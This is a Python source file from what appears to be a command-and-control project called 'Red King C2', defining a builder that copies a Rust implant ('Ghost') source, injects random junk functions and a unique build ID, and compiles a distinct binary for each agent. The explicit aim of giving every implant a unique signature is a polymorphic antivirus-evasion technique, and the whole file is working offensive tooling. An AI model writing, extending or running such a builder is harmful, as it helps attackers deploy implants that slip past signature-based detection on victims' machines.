import os
import shutil
import uuid
import random
import string
import subprocess
import asyncio
from pathlib import Path


class PolymorphicBuilder:
    """
    The Factory: Generates unique biological signatures for every Red King agent.
    """

    def __init__(self):
        self.base_dir = Path("c:/Users/mido7/.gemini/Red_King_C2/ghost")
        self.build_root = Path("c:/Users/mido7/.gemini/Red_King_C2/brain/factory_floor")
        self.build_root.mkdir(parents=True, exist_ok=True)

    def _generate_junk_code(self) -> str:
        """Generates random Rust functions to alter code structure."""
        func_name = "".join(random.choices(string.ascii_lowercase, k=8))
        val = random.randint(0, 9999)
        return f"""
        #[allow(dead_code)]
        fn {func_name}_{val}() -> i32 {{
            let mut x = {val};
            for _ in 0..10 {{ x += 1; }}
            x
        }}
        """

    async def build_payload(self) -> Path:
        """
        Clones the Ghost source, mutates it, and compiles a unique binary.
        """
        build_id = str(uuid.uuid4())
        work_dir = self.build_root / build_id

        # 1. Clone Source
        shutil.copytree(self.base_dir, work_dir)

        # 2. Mutate (The Shapeshifter)
        main_rs = work_dir / "src/main.rs"
        original_code = main_rs.read_text(encoding="utf-8")

        junk = "\n".join([self._generate_junk_code() for _ in range(5)])
        mutated_code = (
            original_code + "\n// Mutant DNA Checksum: " + build_id + "\n" + junk
        )

        main_rs.write_text(mutated_code, encoding="utf-8")

        # 3. Compile (Cargo)
        # Note: We assume 'cargo' is in PATH.
        print(f"[*] Compiling Mutant {build_id}...")

        # We suppress output for clean logs, but needed for debug
        process = await asyncio.create_subprocess_shell(
            "cargo build --release",
            cwd=str(work_dir),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()

        if process.returncode != 0:
            print(f"[-] Compilation Failed: {stderr.decode()}")
            raise Exception("Build Error")

        executable = work_dir / "target/release/red_king_ghost.exe"
        if not executable.exists():
            # Fallback for linux/mac if we were there, but we are on windows
            executable = work_dir / "target/release/red_king_ghost"

        return executable

    def cleanup(self, build_id: str):
        # TODO: remove work_dir
        pass


editor = PolymorphicBuilder()
